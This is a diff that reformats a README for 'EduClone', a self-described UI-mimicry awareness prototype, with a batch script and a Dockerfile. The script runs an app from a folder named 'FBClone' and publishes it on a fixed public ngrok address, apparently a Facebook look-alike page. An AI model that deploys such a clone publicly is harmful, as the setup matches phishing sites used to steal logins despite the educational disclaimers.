@@ -1,22 +1,25 @@
-Project Title: EduClone - UI Security Awareness Prototype
+# Project Title: EduClone - UI Security Awareness Prototype
 
-Overview:
-EduClone is a web application designed purely for educational purposes to raise awareness about UI mimicry and security risks. It helps developers and cybersecurity enthusiasts learn about the potential dangers of account impersonation through similar-looking interfaces. EduClone emphasizes the importance of online vigilance and ethical cybersecurity practices, aiming to equip users with insights on improving security measures. This project is strictly intended as a learning tool to advance responsible cybersecurity knowledge.
+## Overview
+EduClone is a web application designed for educational purposes, focusing on raising awareness about UI mimicry and associated security risks. This project aims to help developers and cybersecurity enthusiasts learn about the potential dangers of account impersonation through similar-looking interfaces. EduClone highlights the importance of online vigilance and ethical cybersecurity practices, providing users with insights on enhancing security measures. **Note**: This project is solely intended as a learning tool to promote responsible cybersecurity knowledge.
 
-------------------------------------------------------------------------------------------------------
-Batch Script for Running the Server:
+---
 
+## Batch Script for Running the Server
 To start the EduClone server and create a secure tunnel, use the following `.bat` file script:
 
-`@echo off
+```batch
+@echo off
 start /min cmd /k "cd /d %USERPROFILE%\Desktop\FBClone && npm start"
-start /min cmd /k "ngrok http --url=humane-newt-formally.ngrok-free.app 3000"`
+start /min cmd /k "ngrok http --url=humane-newt-formally.ngrok-free.app 3000"
+```
 
-------------------------------------------------------------------------------------------------------
-Dockerfile for EduClone:
+---
 
-To containerize EduClone for convenient deployment, use the Docker configuration below. Adjust if necessary:
+## Dockerfile for EduClone
+To containerize EduClone for convenient deployment, use the Docker configuration below. Adjust as needed:
 
+```dockerfile
 # Use a lightweight Node.js image
 FROM node:slim
 
@@ -42,3 +45,4 @@ EXPOSE 3000
 
 # Define the command to run the application
 CMD [ "node", "app.js" ]
+```
